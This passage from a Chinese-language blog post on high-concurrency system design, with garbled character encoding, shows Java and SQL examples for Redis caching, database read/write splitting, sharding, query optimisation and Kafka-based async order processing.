            <span class="hljs-keyword">if</span> (locked) {
                <span class="hljs-comment">// åŒé‡æ£€æŸ¥</span>
                product = redisTemplate.opsForValue().get(cacheKey);
                <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
                    <span class="hljs-keyword">return</span> product;
                }
                
                <span class="hljs-comment">// æŸ¥è¯¢æ•°æ®åº“</span>
                product = productRepository.findById(productId).orElse(<span class="hljs-literal">null</span>);
                
                <span class="hljs-keyword">if</span> (product == <span class="hljs-literal">null</span>) {
                    <span class="hljs-comment">// ç¼“å­˜ç©ºå€¼ï¼Œè¿‡æœŸæ—¶é—´çŸ­</span>
                    redisTemplate.opsForValue().set(nullCacheKey, <span class="hljs-string">"NULL"</span>, <span class="hljs-number">5</span>, TimeUnit.MINUTES);
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-comment">// ç¼“å­˜æ•°æ®</span>
                    redisTemplate.opsForValue().set(cacheKey, product, <span class="hljs-number">1</span>, TimeUnit.HOURS);
                }
                
                <span class="hljs-keyword">return</span> product;
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// æœªè·å–åˆ°é”ï¼ŒçŸ­æš‚ç­‰å¾…åé‡è¯•æˆ–è¿”å›é™çº§æ•°æ®</span>
                Thread.sleep(<span class="hljs-number">100</span>);
                <span class="hljs-keyword">return</span> getProductWithNullCache(productId);
            }
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            Thread.currentThread().interrupt();
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (locked) {
                releaseLock(lockKey);
            }
        }
    }
    
    <span class="hljs-comment">/**
     * é˜²æ­¢ç¼“å­˜é›ªå´©ï¼šéšæœºè¿‡æœŸæ—¶é—´
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setWithRandomExpire</span><span class="hljs-params">(String key, Object value, <span class="hljs-type">long</span> baseExpire, TimeUnit unit)</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">expireTime</span> <span class="hljs-operator">=</span> unit.toMillis(baseExpire);
        
        <span class="hljs-comment">// å¢åŠ éšæœºåç§»é‡ï¼ˆÂ±20%ï¼‰</span>
        <span class="hljs-type">double</span> <span class="hljs-variable">randomFactor</span> <span class="hljs-operator">=</span> <span class="hljs-number">0.8</span> + Math.random() * <span class="hljs-number">0.4</span>; <span class="hljs-comment">// 0.8 ~ 1.2</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">actualExpire</span> <span class="hljs-operator">=</span> (<span class="hljs-type">long</span>) (expireTime * randomFactor);
        
        redisTemplate.opsForValue().set(
            key, value, actualExpire, TimeUnit.MILLISECONDS
        );
    }
    
    <span class="hljs-comment">/**
     * çƒ­ç‚¹æ•°æ®å‘ç°ä¸è‡ªåŠ¨ç¼“å­˜
     */</span>
    <span class="hljs-meta">@Scheduled(fixedDelay = 60000)</span> <span class="hljs-comment">// æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">discoverHotData</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ä»Redisç»Ÿè®¡è®¿é—®é¢‘ç‡</span>
        Set&lt;String&gt; hotKeys = findHotKeys();
        
        <span class="hljs-keyword">for</span> (String key : hotKeys) {
            <span class="hljs-comment">// å°†çƒ­ç‚¹æ•°æ®åŠ è½½åˆ°æœ¬åœ°ç¼“å­˜</span>
            <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(key);
            <span class="hljs-keyword">if</span> (value != <span class="hljs-literal">null</span>) {
                localCache.put(key, value);
            }
        }
    }
}
</code></pre>
<h2 data-id="heading-16">05 æ•°æ®åº“è®¾è®¡ï¼šä»å•æœºåˆ°åˆ†å¸ƒå¼</h2>
<p>æ•°æ®åº“æ˜¯ç³»ç»Ÿçš„æ ¸å¿ƒï¼Œä¹Ÿæ˜¯åƒä¸‡çº§ç³»ç»Ÿæœ€éš¾æ‰©å±•çš„éƒ¨åˆ†ã€‚</p>
<h3 data-id="heading-17">è¯»å†™åˆ†ç¦»</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataSourceConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-meta">@Primary</span>
    <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">dataSource</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ä¸»ä»æ•°æ®æºé…ç½®</span>
        Map&lt;Object, Object&gt; targetDataSources = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        
        <span class="hljs-comment">// ä¸»åº“</span>
        <span class="hljs-type">DataSource</span> <span class="hljs-variable">masterDataSource</span> <span class="hljs-operator">=</span> createDataSource(
            <span class="hljs-string">"jdbc:mysql://master-db:3306/db?useSSL=false"</span>,
            <span class="hljs-string">"master_user"</span>,
            <span class="hljs-string">"master_password"</span>
        );
        targetDataSources.put(DataSourceType.MASTER, masterDataSource);
        
        <span class="hljs-comment">// ä»åº“1</span>
        <span class="hljs-type">DataSource</span> <span class="hljs-variable">slave1DataSource</span> <span class="hljs-operator">=</span> createDataSource(
            <span class="hljs-string">"jdbc:mysql://slave1-db:3306/db?useSSL=false"</span>,
            <span class="hljs-string">"slave_user"</span>,
            <span class="hljs-string">"slave_password"</span>
        );
        targetDataSources.put(<span class="hljs-string">"slave1"</span>, slave1DataSource);
        
        <span class="hljs-comment">// ä»åº“2</span>
        <span class="hljs-type">DataSource</span> <span class="hljs-variable">slave2DataSource</span> <span class="hljs-operator">=</span> createDataSource(
            <span class="hljs-string">"jdbc:mysql://slave2-db:3306/db?useSSL=false"</span>,
            <span class="hljs-string">"slave_user"</span>,
            <span class="hljs-string">"slave_password"</span>
        );
        targetDataSources.put(<span class="hljs-string">"slave2"</span>, slave2DataSource);
        
        <span class="hljs-comment">// åŠ¨æ€æ•°æ®æº</span>
        <span class="hljs-type">DynamicDataSource</span> <span class="hljs-variable">dynamicDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DynamicDataSource</span>();
        dynamicDataSource.setDefaultTargetDataSource(masterDataSource);
        dynamicDataSource.setTargetDataSources(targetDataSources);
        
        <span class="hljs-keyword">return</span> dynamicDataSource;
    }
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> AbstractRoutingDataSource <span class="hljs-title function_">routingDataSource</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbstractRoutingDataSource</span>() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">determineCurrentLookupKey</span><span class="hljs-params">()</span> {
                <span class="hljs-keyword">return</span> DynamicDataSourceContextHolder.getDataSourceType();
            }
        };
    }
    
    <span class="hljs-meta">@Aspect</span>
    <span class="hljs-meta">@Component</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataSourceAspect</span> {
        
        <span class="hljs-meta">@Before("@annotation(com.example.annotation.Master)")</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMasterDataSource</span><span class="hljs-params">()</span> {
            DynamicDataSourceContextHolder.setDataSourceType(DataSourceType.MASTER);
        }
        
        <span class="hljs-meta">@Before("@annotation(com.example.annotation.Slave)")</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSlaveDataSource</span><span class="hljs-params">()</span> {
            <span class="hljs-comment">// éšæœºé€‰æ‹©ä»åº“</span>
            String[] slaves = {<span class="hljs-string">"slave1"</span>, <span class="hljs-string">"slave2"</span>};
            <span class="hljs-type">String</span> <span class="hljs-variable">selectedSlave</span> <span class="hljs-operator">=</span> slaves[ThreadLocalRandom.current().nextInt(slaves.length)];
            DynamicDataSourceContextHolder.setDataSourceType(selectedSlave);
        }
        
        <span class="hljs-meta">@After("@annotation(com.example.annotation.Master) || " +
               "@annotation(com.example.annotation.Slave)")</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">clearDataSource</span><span class="hljs-params">()</span> {
            DynamicDataSourceContextHolder.clearDataSourceType();
        }
    }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    
    <span class="hljs-meta">@Master</span> <span class="hljs-comment">// ä½¿ç”¨ä¸»åº“</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Order order)</span> {
        orderRepository.save(order); <span class="hljs-comment">// å†™æ“ä½œ</span>
    }
    
    <span class="hljs-meta">@Slave</span> <span class="hljs-comment">// ä½¿ç”¨ä»åº“</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">getOrder</span><span class="hljs-params">(Long orderId)</span> {
        <span class="hljs-keyword">return</span> orderRepository.findById(orderId).orElse(<span class="hljs-literal">null</span>); <span class="hljs-comment">// è¯»æ“ä½œ</span>
    }
}
</code></pre>
<h3 data-id="heading-18">åˆ†åº“åˆ†è¡¨</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ†ç‰‡ç­–ç•¥ï¼šç”¨æˆ·IDå–æ¨¡åˆ†ç‰‡</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserShardingStrategy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">PreciseShardingAlgorithm</span>&lt;Long&gt; {
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">doSharding</span><span class="hljs-params">(Collection&lt;String&gt; availableTargetNames, 
                             PreciseShardingValue&lt;Long&gt; shardingValue)</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> shardingValue.getValue();
        
        <span class="hljs-comment">// åˆ†ç‰‡æ•°</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">shardCount</span> <span class="hljs-operator">=</span> availableTargetNames.size();
        
        <span class="hljs-comment">// ç®€å•å–æ¨¡åˆ†ç‰‡</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">shardIndex</span> <span class="hljs-operator">=</span> userId % shardCount;
        
        <span class="hljs-keyword">for</span> (String tableName : availableTargetNames) {
            <span class="hljs-keyword">if</span> (tableName.endsWith(<span class="hljs-string">"_"</span> + shardIndex)) {
                <span class="hljs-keyword">return</span> tableName;
            }
        }
        
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>(<span class="hljs-string">"æ— æ³•æ‰¾åˆ°å¯¹åº”çš„åˆ†ç‰‡è¡¨"</span>);
    }
}

<span class="hljs-comment">// åˆ†åº“åˆ†è¡¨é…ç½®</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShardingConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">shardingDataSource</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-comment">// æ•°æ®æºæ˜ å°„</span>
        Map&lt;String, DataSource&gt; dataSourceMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        dataSourceMap.put(<span class="hljs-string">"ds0"</span>, createDataSource(<span class="hljs-string">"jdbc:mysql://db0:3306/db"</span>));
        dataSourceMap.put(<span class="hljs-string">"ds1"</span>, createDataSource(<span class="hljs-string">"jdbc:mysql://db1:3306/db"</span>));
        dataSourceMap.put(<span class="hljs-string">"ds2"</span>, createDataSource(<span class="hljs-string">"jdbc:mysql://db2:3306/db"</span>));
        
        <span class="hljs-comment">// ç”¨æˆ·è¡¨åˆ†ç‰‡è§„åˆ™</span>
        <span class="hljs-type">ShardingRuleConfiguration</span> <span class="hljs-variable">shardingRuleConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShardingRuleConfiguration</span>();
        
        <span class="hljs-comment">// ç”¨æˆ·è¡¨åˆ†è¡¨è§„åˆ™</span>
        <span class="hljs-type">TableRuleConfiguration</span> <span class="hljs-variable">userTableRuleConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TableRuleConfiguration</span>(<span class="hljs-string">"user"</span>, <span class="hljs-string">"ds${0..2}.user_${0..7}"</span>);
        userTableRuleConfig.setDatabaseShardingStrategyConfig(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InlineShardingStrategyConfiguration</span>(<span class="hljs-string">"id"</span>, <span class="hljs-string">"ds${id % 3}"</span>)
        );
        userTableRuleConfig.setTableShardingStrategyConfig(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardShardingStrategyConfiguration</span>(<span class="hljs-string">"id"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserShardingStrategy</span>())
        );
        
        <span class="hljs-comment">// è®¢å•è¡¨åˆ†è¡¨è§„åˆ™</span>
        <span class="hljs-type">TableRuleConfiguration</span> <span class="hljs-variable">orderTableRuleConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TableRuleConfiguration</span>(<span class="hljs-string">"order"</span>, <span class="hljs-string">"ds${0..2}.order_${0..15}"</span>);
        orderTableRuleConfig.setDatabaseShardingStrategyConfig(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InlineShardingStrategyConfiguration</span>(<span class="hljs-string">"user_id"</span>, <span class="hljs-string">"ds${user_id % 3}"</span>)
        );
        orderTableRuleConfig.setTableShardingStrategyConfig(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InlineShardingStrategyConfiguration</span>(<span class="hljs-string">"order_id"</span>, <span class="hljs-string">"order_${order_id % 16}"</span>)
        );
        
        shardingRuleConfig.getTableRuleConfigs().add(userTableRuleConfig);
        shardingRuleConfig.getTableRuleConfigs().add(orderTableRuleConfig);
        
        <span class="hljs-comment">// åˆ›å»ºShardingSphereæ•°æ®æº</span>
        <span class="hljs-keyword">return</span> ShardingSphereDataSourceFactory.createDataSource(
            dataSourceMap, Collections.singleton(shardingRuleConfig), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>()
        );
    }
}
</code></pre>
<h3 data-id="heading-19">æ•°æ®åº“ä¼˜åŒ–å®æˆ˜</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 1. ç´¢å¼•ä¼˜åŒ–ç¤ºä¾‹</span>
<span class="hljs-comment">-- é”™è¯¯çš„ç´¢å¼•è®¾è®¡</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_user_email <span class="hljs-keyword">ON</span> <span class="hljs-keyword">user</span>(email); <span class="hljs-comment">-- è¿‡é•¿çš„ç´¢å¼•</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_user_status <span class="hljs-keyword">ON</span> <span class="hljs-keyword">user</span>(status); <span class="hljs-comment">-- ä½åŒºåˆ†åº¦çš„ç´¢å¼•</span>

<span class="hljs-comment">-- æ­£ç¡®çš„ç´¢å¼•è®¾è®¡</span>
<span class="hljs-comment">-- è”åˆç´¢å¼•ï¼Œæ³¨æ„å­—æ®µé¡ºåº</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_user_created_status <span class="hljs-keyword">ON</span> <span class="hljs-keyword">user</span>(created_at, status);
<span class="hljs-comment">-- å‰ç¼€ç´¢å¼•ï¼Œé€‚åˆé•¿å­—æ®µ</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_user_email_prefix <span class="hljs-keyword">ON</span> <span class="hljs-keyword">user</span>(email(<span class="hljs-number">20</span>));

<span class="hljs-comment">-- 2. æ…¢æŸ¥è¯¢ä¼˜åŒ–ç¤ºä¾‹</span>
<span class="hljs-comment">-- ä¼˜åŒ–å‰ï¼šå…¨è¡¨æ‰«æ</span>
EXPLAIN <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">YEAR</span>(created_at) <span class="hljs-operator">=</span> <span class="hljs-number">2024</span>;

<span class="hljs-comment">-- ä¼˜åŒ–åï¼šä½¿ç”¨ç´¢å¼•</span>
EXPLAIN <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">order</span> 
<span class="hljs-keyword">WHERE</span> created_at <span class="hljs-operator">&gt;=</span> <span class="hljs-string">'2024-01-01'</span> 
  <span class="hljs-keyword">AND</span> created_at <span class="hljs-operator">&lt;</span> <span class="hljs-string">'2025-01-01'</span>;

<span class="hljs-comment">-- 3. åˆ†é¡µä¼˜åŒ–</span>
<span class="hljs-comment">-- ä¼ ç»Ÿåˆ†é¡µï¼ˆæ•°æ®é‡å¤§æ—¶æ…¢ï¼‰</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id LIMIT <span class="hljs-number">1000000</span>, <span class="hljs-number">20</span>;

<span class="hljs-comment">-- ä¼˜åŒ–åˆ†é¡µï¼ˆä½¿ç”¨è¦†ç›–ç´¢å¼•ï¼‰</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> 
<span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id LIMIT <span class="hljs-number">1000000</span>, <span class="hljs-number">1</span>)
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id LIMIT <span class="hljs-number">20</span>;

<span class="hljs-comment">-- 4. æ‰¹é‡æ“ä½œä¼˜åŒ–</span>
<span class="hljs-comment">-- æ‰¹é‡æ’å…¥</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">user</span> (name, email) <span class="hljs-keyword">VALUES</span> 
(<span class="hljs-string">'user1'</span>, <span class="hljs-string">'user1@example.com'</span>),
(<span class="hljs-string">'user2'</span>, <span class="hljs-string">'user2@example.com'</span>),
<span class="hljs-comment">-- ... 1000æ¡</span>
(<span class="hljs-string">'user1000'</span>, <span class="hljs-string">'user1000@example.com'</span>);

<span class="hljs-comment">-- æ‰¹é‡æ›´æ–°ï¼ˆé¿å…åœ¨å¾ªç¯ä¸­å•æ¡æ›´æ–°ï¼‰</span>
<span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">SET</span> status <span class="hljs-operator">=</span> <span class="hljs-string">'active'</span> 
<span class="hljs-keyword">WHERE</span> id <span class="hljs-keyword">IN</span> (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, ..., <span class="hljs-number">1000</span>);
</code></pre>
<h2 data-id="heading-20">06 å¼‚æ­¥å¤„ç†ä¸æ¶ˆæ¯é˜Ÿåˆ—</h2>
<p>å¯¹äºåƒä¸‡çº§ç³»ç»Ÿï¼ŒåŒæ­¥å¤„ç†æ‰€æœ‰è¯·æ±‚æ˜¯ä¸ç°å®çš„ã€‚å¼‚æ­¥åŒ–æ˜¯æé«˜ç³»ç»Ÿååé‡çš„å…³é”®ã€‚</p>
<h3 data-id="heading-21">æ¶ˆæ¯é˜Ÿåˆ—è®¾è®¡</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">KafkaConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> ProducerFactory&lt;String, String&gt; <span class="hljs-title function_">producerFactory</span><span class="hljs-params">()</span> {
        Map&lt;String, Object&gt; configProps = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        configProps.put(
            ProducerConfig.BOOTSTRAP_SERVERS_CONFIG,
            <span class="hljs-string">"kafka1:9092,kafka2:9092,kafka3:9092"</span>
        );
        configProps.put(
            ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG,
            StringSerializer.class
        );
        configProps.put(
            ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG,
            StringSerializer.class
        );
        <span class="hljs-comment">// é«˜ååé‡é…ç½®</span>
        configProps.put(ProducerConfig.LINGER_MS_CONFIG, <span class="hljs-number">20</span>); <span class="hljs-comment">// æ‰¹é‡å‘é€å»¶è¿Ÿ</span>
        configProps.put(ProducerConfig.BATCH_SIZE_CONFIG, <span class="hljs-number">32</span> * <span class="hljs-number">1024</span>); <span class="hljs-comment">// æ‰¹é‡å¤§å°</span>
        configProps.put(ProducerConfig.COMPRESSION_TYPE_CONFIG, <span class="hljs-string">"lz4"</span>); <span class="hljs-comment">// å‹ç¼©</span>
        
        <span class="hljs-comment">// é«˜å¯é æ€§é…ç½®</span>
        configProps.put(ProducerConfig.ACKS_CONFIG, <span class="hljs-string">"all"</span>); <span class="hljs-comment">// æ‰€æœ‰å‰¯æœ¬ç¡®è®¤</span>
        configProps.put(ProducerConfig.RETRIES_CONFIG, <span class="hljs-number">3</span>); <span class="hljs-comment">// é‡è¯•æ¬¡æ•°</span>
        configProps.put(ProducerConfig.ENABLE_IDEMPOTENCE_CONFIG, <span class="hljs-literal">true</span>); <span class="hljs-comment">// å¹‚ç­‰æ€§</span>
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultKafkaProducerFactory</span>&lt;&gt;(configProps);
    }
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> KafkaTemplate&lt;String, String&gt; <span class="hljs-title function_">kafkaTemplate</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaTemplate</span>&lt;&gt;(producerFactory());
    }
}

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderMessageService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> KafkaTemplate&lt;String, String&gt; kafkaTemplate;
    
    <span class="hljs-comment">// é¡ºåºæ¶ˆæ¯å‘é€</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendOrderEvent</span><span class="hljs-params">(OrderEvent event)</span> {
        <span class="hljs-comment">// ä½¿ç”¨è®¢å•IDä½œä¸ºkeyï¼Œä¿è¯åŒä¸€è®¢å•çš„æ¶ˆæ¯é¡ºåº</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> String.valueOf(event.getOrderId());
        <span class="hljs-type">String</span> <span class="hljs-variable">topic</span> <span class="hljs-operator">=</span> <span class="hljs-string">"order-events"</span>;
        
        kafkaTemplate.send(topic, key, JsonUtils.toJson(event))
            .addCallback(
                result -&gt; log.info(<span class="hljs-string">"æ¶ˆæ¯å‘é€æˆåŠŸ: {}"</span>, event),
                ex -&gt; {
                    log.error(<span class="hljs-string">"æ¶ˆæ¯å‘é€å¤±è´¥: {}"</span>, event, ex);
                    <span class="hljs-comment">// å¤±è´¥å¤„ç†ï¼šè®°å½•åˆ°æ•°æ®åº“ï¼Œå®šæ—¶é‡è¯•</span>
                    saveFailedMessage(event, ex.getMessage());
                }
            );
    }
    
    <span class="hljs-comment">// æ‰¹é‡æ¶ˆæ¯å¤„ç†</span>
    <span class="hljs-meta">@KafkaListener(topics = "order-events", 
                   containerFactory = "batchFactory")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processOrderEvents</span><span class="hljs-params">(List&lt;ConsumerRecord&lt;String, String&gt;&gt; records)</span> {
        List&lt;OrderEvent&gt; events = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        
        <span class="hljs-keyword">for</span> (ConsumerRecord&lt;String, String&gt; record : records) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">OrderEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span> JsonUtils.fromJson(record.value(), OrderEvent.class);
                events.add(event);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                log.error(<span class="hljs-string">"æ¶ˆæ¯è§£æå¤±è´¥: {}"</span>, record.value(), e);
            }
        }
        
        <span class="hljs-keyword">if</span> (!events.isEmpty()) {
            <span class="hljs-comment">// æ‰¹é‡å¤„ç†</span>
            batchProcessOrders(events);
        }
    }
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> ConcurrentKafkaListenerContainerFactory&lt;String, String&gt; <span class="hljs-title function_">batchFactory</span><span class="hljs-params">()</span> {
        ConcurrentKafkaListenerContainerFactory&lt;String, String&gt; factory =
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentKafkaListenerContainerFactory</span>&lt;&gt;();
        factory.setConsumerFactory(consumerFactory());
        factory.setBatchListener(<span class="hljs-literal">true</span>); <span class="hljs-comment">// å¼€å¯æ‰¹é‡ç›‘å¬</span>
        factory.getContainerProperties().setPollTimeout(<span class="hljs-number">3000</span>);
        <span class="hljs-keyword">return</span> factory;
    }
}
</code></pre>
<h3 data-id="heading-22">å¼‚æ­¥å¤„ç†æ¨¡å¼</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. CompletableFutureå¼‚æ­¥å¤„ç†</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncOrderService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ThreadPoolTaskExecutor taskExecutor;
    
    <span class="hljs-keyword">public</span> CompletableFuture&lt;OrderResult&gt; <span class="hljs-title function_">createOrderAsync</span><span class="hljs-params">(OrderRequest request)</span> {
        <span class="hljs-keyword">return</span> CompletableFuture.supplyAsync(() -&gt; {
            <span class="hljs-comment">// ç¬¬ä¸€æ­¥ï¼šæ ¡éªŒ</span>
            validateOrder(request);
            
            <span class="hljs-keyword">return</span> request;
        }, taskExecutor).thenComposeAsync(validatedRequest -&gt; {
            <span class="hljs-comment">// ç¬¬äºŒæ­¥ï¼šæ‰£å‡åº“å­˜</span>
            <span class="hljs-keyword">return</span> reduceInventoryAsync(validatedRequest);
        }, taskExecutor).thenComposeAsync(inventoryResult -&gt; {
            <span class="hljs-comment">// ç¬¬ä¸‰æ­¥ï¼šç”Ÿæˆè®¢å•</span>
            <span class="hljs-keyword">return</span> generateOrderAsync(inventoryResult);
        }, taskExecutor).thenApplyAsync(order -&gt; {
            <span class="hljs-comment">// ç¬¬å››æ­¥ï¼šå‘é€é€šçŸ¥</span>
            sendNotification(order);
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderResult</span>(order, <span class="hljs-string">"SUCCESS"</span>);
        }, taskExecutor).exceptionally(ex -&gt; {
            <span class="hljs-comment">// å¼‚å¸¸å¤„ç†</span>
            log.error(<span class="hljs-string">"è®¢å•åˆ›å»ºå¤±è´¥"</span>, ex);
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderResult</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">"FAILED: "</span> + ex.getMessage());
        });
    }
    
    <span class="hljs-comment">// 2. äº‹ä»¶é©±åŠ¨æ¶æ„</span>
    <span class="hljs-meta">@Component</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderEventPublisher</span> {
        
        <span class="hljs-meta">@Autowired</span>
        <span class="hljs-keyword">private</span> ApplicationEventPublisher eventPublisher;
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Order order)</span> {
            <span class="hljs-comment">// ä¿å­˜è®¢å•</span>
            orderRepository.save(order);
            
            <span class="hljs-comment">// å‘å¸ƒé¢†åŸŸäº‹ä»¶</span>
            eventPublisher.publishEvent(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderCreatedEvent</span>(<span class="hljs-built_in">this</span>, order));
        }
    }
    
    <span class="hljs-meta">@Component</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderEventListener</span> {
        
        <span class="hljs-meta">@EventListener</span>
        <span class="hljs-meta">@Async</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleOrderCreated</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
            <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> event.getOrder();
            
            <span class="hljs-comment">// å¼‚æ­¥å‘é€é‚®ä»¶</span>
            emailService.sendOrderConfirmation(order);
            
